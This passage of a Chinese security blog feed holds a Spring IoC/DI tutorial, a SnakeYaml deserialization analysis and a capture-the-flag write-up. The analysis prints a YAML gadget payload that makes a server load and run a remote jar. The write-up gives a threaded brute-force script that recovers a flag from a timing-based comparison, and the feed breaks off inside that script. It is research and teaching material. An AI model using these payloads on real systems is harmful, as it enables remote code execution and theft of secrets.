class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.LSE.dto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line">    <span class="keyword">public</span> String password;</span><br><span class="line">    <span class="keyword">public</span> String email;</span><br><span class="line">    <span class="keyword">public</span> String created_at;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.LSE.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.LSE.dto.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.LSE.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.LSE.dto.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.LSE.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.LSE.Mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.LSE.dto.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceimpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> UserMapper userMapper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;User&gt; list = userMapper.findAll();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>我上面的代码较为不错的展示了三层架构，其中还用到了ioc和di这个知识点也就是AutoWired这个注解。</p><p>如果没有这个注解我们的代码应该是将<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    @Autowired</span><br><span class="line">    public UserService userService;</span><br><span class="line">改为</span><br><span class="line">    public UserService userService=new UserServiceimpl;</span><br></pre></td></tr></table></figure><br>也就是要用到new来实例化方法，这就导致我我们代码之间的关联度增加了，也就是当我们service层的代码改变如类名改了我们的Contorller层就得改。这时候就要友人ioc和id了</p><h2 id="ioc与di"><a href="#ioc与di" class="headerlink" title="ioc与di"></a>ioc与di</h2><p>这两个的全称为Inversion of Control(控制反转)和 Dependency Injection(依赖注入)<br>ico的作用就是将我们类的bean传到容器中，DI的作用就是将我们容器的bean注入到变量里</p><p>这样添加一个容器我们就可以降低各个层间的耦合度</p><h3 id="ioc"><a href="#ioc" class="headerlink" title="ioc"></a>ioc</h3><p>我们在springboot中可以使用@Component来对我们要传入容器的类进行标记。这样在程序启动时就会自动将其传入容器<br>当一帮不使用这个而是使用如下的</p><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><div class="table-container"><table><thead><tr><th>注解</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>@Component</code></td><td>通用注解，标记一个类为 Spring 管理的 Bean</td><td><code>@Component public class UserService &#123;&#125;</code></td></tr><tr><td><code>@Service</code></td><td>语义化注解，用于<strong>业务层</strong>（Service 类）</td><td><code>@Service public class UserServiceImpl &#123;&#125;</code></td></tr><tr><td><code>@Repository</code></td><td>语义化注解，用于<strong>数据访问层</strong>（DAO 类）</td><td><code>@Repository public class UserDaoImpl &#123;&#125;</code></td></tr><tr><td><code>@Controller</code></td><td>语义化注解，用于<strong>控制器层</strong>（Web 请求处理）</td><td><code>@Controller public class UserController &#123;&#125;</code></td></tr><tr><td><code>@Configuration</code></td><td>标记一个类为<strong>配置类</strong>，定义 Bean</td><td><code>@Configuration public class AppConfig &#123;&#125;</code></td></tr><tr><td><code>@Bean</code></td><td>在配置类中定义 Bean 的方法上使用</td><td><code>@Bean public DataSource dataSource() &#123; ... &#125;</code></td></tr></tbody></table></div><h3 id="2-DI（依赖注入）的注解"><a href="#2-DI（依赖注入）的注解" class="headerlink" title="2. DI（依赖注入）的注解"></a><strong>2. DI（依赖注入）的注解</strong></h3><h4 id="2-1-自动注入"><a href="#2-1-自动注入" class="headerlink" title="2.1 自动注入"></a><strong>2.1 自动注入</strong></h4><div class="table-container"><table><thead><tr><th>注解</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>@Autowired</code></td><td><strong>按类型</strong>自动注入依赖（默认优先匹配类型）</td><td><code>@Autowired private UserService userService;</code></td></tr><tr><td><code>@Qualifier</code></td><td><strong>按名称</strong>指定注入的 Bean（配合 <code>@Autowired</code> 使用）</td><td><code>@Autowired @Qualifier(&quot;mysqlUserDao&quot;) private UserDao userDao;</code></td></tr><tr><td><code>@Primary</code></td><td>标记<strong>优先注入</strong>的 Bean（解决同一类型多个 Bean 的冲突）</td><td><code>@Primary @Service public class DefaultUserService &#123;&#125;</code></td></tr><tr><td><code>@Resource</code></td><td><strong>按名称</strong>注入（JDK 原生注解，支持 <code>name</code> 属性）</td><td><code>@Resource(name = &quot;userDao&quot;) private UserDao dao;</code></td></tr><tr><td><code>@Inject</code></td><td><strong>按类型</strong>注入（需依赖 <code>javax.inject</code>，类似 <code>@Autowired</code>）</td><td><code>@Inject private PaymentService paymentService;</code></td></tr></tbody></table></div><h4 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h4><p>当一个接口有多个bean时就可能对造成bean冲突，这时候我们就需要使用@Primary和@Qualifier()来进行注入<br>bean的名称默认是类首字母小写</p><h4 id="2-2-注入方式"><a href="#2-2-注入方式" class="headerlink" title="2.2 注入方式"></a><strong>2.2 注入方式</strong></h4><h5 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserDao userDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="构造器注入"><a href="#构造器注入" class="headerlink" title="构造器注入"></a>构造器注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造器注入（Spring 4.3+ 可省略 @Autowired）</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="setter方法注入"><a href="#setter方法注入" class="headerlink" title="setter方法注入"></a>setter方法注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserDao userDao;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">setUserService</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-组件扫描与配置"><a href="#3-组件扫描与配置" class="headerlink" title="3. 组件扫描与配置"></a><strong>3. 组件扫描与配置</strong></h3><div class="table-container"><table><thead><tr><th>注解</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>@ComponentScan</code></td><td>指定 Spring 扫描 Bean 的包路径（通常用于主类）</td><td><code>@ComponentScan(&quot;com.example&quot;)</code></td></tr><tr><td><code>@Profile</code></td><td>指定 Bean 的生效环境（如 <code>dev</code>、<code>test</code>、<code>prod</code>）</td><td><code>@Profile(&quot;dev&quot;) @Service public class MockUserService &#123;&#125;</code></td></tr><tr><td><code>@Conditional</code></td><td><strong>条件化注入</strong>（根据条件决定是否创建 Bean）</td><td><code>@Conditional(OnCloudCondition.class)</code></td></tr></tbody></table></div><hr><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JDBC&quot;&gt;&lt;a href=&quot;#JDBC&quot; class=&quot;headerlink&quot; title=&quot;JDBC&quot;&gt;&lt;/a&gt;JDBC&lt;/h1&gt;&lt;p&gt;JDBC全称Java DataBase Connectivity。&lt;/p&gt;
&lt;p&gt;JDBC再进行sql查询的步骤如下&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SnakeYaml</title>
    <link href="https://lisien11.xyz/2025/05/05/SnakeYaml/"/>
    <id>https://lisien11.xyz/2025/05/05/SnakeYaml/</id>
    <published>2025-05-05T14:10:54.000Z</published>
    <updated>2025-05-06T06:57:56.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h1><p>SnakeYAML 是一个用于 Java 平台的 YAML 处理库，能够解析和生成符合 YAML 1.1 规范的数据格式。它广泛应用于 Java 生态系统中，尤其是在需要处理配置文件（如 Spring Boot 的 application.yml）或数据序列化的场景中。</p><p>SnakeYAML出现安全问题的原因和fastjson很像，都是英文其可以序列化和反序列化对象，再反序列化时会触发类的构造方法和set方法。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sankeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sankeYaml;</span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestYaml</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;LSE&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> yaml.dump(user);</span><br><span class="line">        System.out.println(out);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出为</p><img src="/2025/05/05/SnakeYaml/IMG_20250505-225527242.png" class="">  <p>序列化会触发get方法<br>可以发现其对于类的话是!!加全类名来进行表示，其和fastjson的@Type很像</p><p>我们将其反序列化看看</p><img src="/2025/05/05/SnakeYaml/IMG_20250505-225308793.png" class="">  <p>可以发现其触发了setAge和setName，和构造方法<br>那么其应该就可以触发很多fastjson可以触发的链子</p><h1 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h1><p>网上广为流传的一条链子就是如下的<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [ <span class="type">!!java.net.URLClassLoader</span> [[ <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8002/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure><br>其其实就相当于<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>(<span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(&#123; <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8002/yaml-payload.jar&quot;</span>) &#125;)))</span><br></pre></td></tr></table></figure><br>这个链子是针对构造方法的一条链子<br><img src="/2025/05/05/SnakeYaml/IMG_20250506-090442046.png" class=""><br>简单调一下<br><img src="/2025/05/05/SnakeYaml/IMG_20250506-090914615.png" class=""><br>反序列化后先调用到了构造方法ScriptEngineManager<br><img src="/2025/05/05/SnakeYaml/IMG_20250506-090954959.png" class=""><br>参数就是我们传入的URLClassLoader然后步入init</p><p>一顿赋值之后进入initEngines</p><img src="/2025/05/05/SnakeYaml/IMG_20250506-091337563.png" class="">  <p>initEngines 会获取到获取到ServiceLoader，而ServiceLoader就涉及到了SPI机制了。<br>SPI机制就是java中远程调用类的一个机制，其可以调用远程jar包中的类<br>下面是一个demo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Loader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 加载远程 JAR</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8002/yaml-payload.jar&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 ServiceLoader + 自定义 ClassLoader 加载实现</span></span><br><span class="line">        ServiceLoader&lt;MyService&gt; services = ServiceLoader.load(MyService.class, loader);</span><br><span class="line">        <span class="keyword">for</span> (MyService s : services) &#123;</span><br><span class="line">            s.hello(); <span class="comment">// 调用远程 jar 中的逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>可以看到其使用ServiceLoader.load来加载远程的jar包生成返回一个引擎。然后for循环就是获取META-INF/services/的值然后调用其类方法</p><img src="/2025/05/05/SnakeYaml/IMG_20250506-100327274.png" class="">  <p>在load到远程对象后会调用hasnext和next，这个其实就是遍历META-INF/services了<br>我们步入next看看<br><img src="/2025/05/05/SnakeYaml/IMG_20250506-091618765.png" class=""><br><img src="/2025/05/05/SnakeYaml/IMG_20250506-091659471.png" class=""><br><img src="/2025/05/05/SnakeYaml/IMG_20250506-091723120.png" class=""><br>可以看到其forname加载了类然后实例化。第一次加载的是jdk.nashorn.api.scripting.NashornScriptEngineFactory也就是META-INF/services 目录下的文件名，而这个文件名必须要为加载接口的全类名，即ScriptEngineFactory，第二次加载的是我们远程的恶意类<br><img src="/2025/05/05/SnakeYaml/IMG_20250506-100902678.png" class="">  </p><p>恶意类项目结构如下<br><img src="/2025/05/05/SnakeYaml/IMG_20250506-102039895.png" class=""><br><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SnakeYaml&quot;&gt;&lt;a href=&quot;#SnakeYaml&quot; class=&quot;headerlink&quot; title=&quot;SnakeYaml&quot;&gt;&lt;/a&gt;SnakeYaml&lt;/h1&gt;&lt;p&gt;SnakeYAML 是一个用于 Java 平台的 YAML 处理库，能够解析和生成符</summary>
      
    
    
    
    <category term="java" scheme="https://lisien11.xyz/categories/java/"/>
    
    
    <category term="java" scheme="https://lisien11.xyz/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>FCTF</title>
    <link href="https://lisien11.xyz/2025/05/02/FCTF/"/>
    <id>https://lisien11.xyz/2025/05/02/FCTF/</id>
    <published>2025-05-02T14:41:24.000Z</published>
    <updated>2025-05-06T06:57:19.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写点有意思的题目吧"><a href="#写点有意思的题目吧" class="headerlink" title="写点有意思的题目吧"></a>写点有意思的题目吧</h1><h1 id="ez-time"><a href="#ez-time" class="headerlink" title="ez_time"></a>ez_time</h1><p>这题的重点代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是一个可爱的加密函数~</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>,<span class="number">0</span>,<span class="title function_ invoke__">time</span>()%<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是一个可爱的校验函数~</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params"><span class="variable">$encryptedString</span>, <span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">encrypt</span>(<span class="variable">$string</span>) === <span class="variable">$encryptedString</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">// 你过关！</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">// 再接再厉~</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$guessMyFlag</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;guessMyFlag&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">compare</span>(<span class="title function_ invoke__">encrypt</span>(<span class="variable">$guessMyFlag</span>),<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你过关！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们可以看到其将时间戳余20当成长度。来分割flag和我们传入的字符串进行比较。那么就可以写脚本爆破<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep, time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">all_chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)])</span><br><span class="line">x = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.fctf.rois.team:25014/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_char</span>(<span class="params">c, prefix</span>):</span><br><span class="line">    flag = prefix + c</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, data=&#123;<span class="string">&#x27;guessMyFlag&#x27;</span>: flag&#125;, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;你过关！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 命中：<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 请求失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    target_len = <span class="built_in">len</span>(x) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 等待到 time()%20 == target_len</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">int</span>(time() % <span class="number">20</span>) != target_len+<span class="number">1</span>:</span><br><span class="line">        sleep(<span class="number">0.01</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在爆破第 <span class="subst">&#123;target_len&#125;</span> 个字符... 当前前缀：<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">30</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        futures = &#123;executor.submit(try_char, c, x): c <span class="keyword">for</span> c <span class="keyword">in</span> all_chars&#125;</span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(futures):</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                x += result</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 停止其他线程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 没有在 time()%20 == <span class="subst">&#123;target_len&#125;</span> 时匹配成功，等待下次...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[√] 当前 flag 前缀：<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span 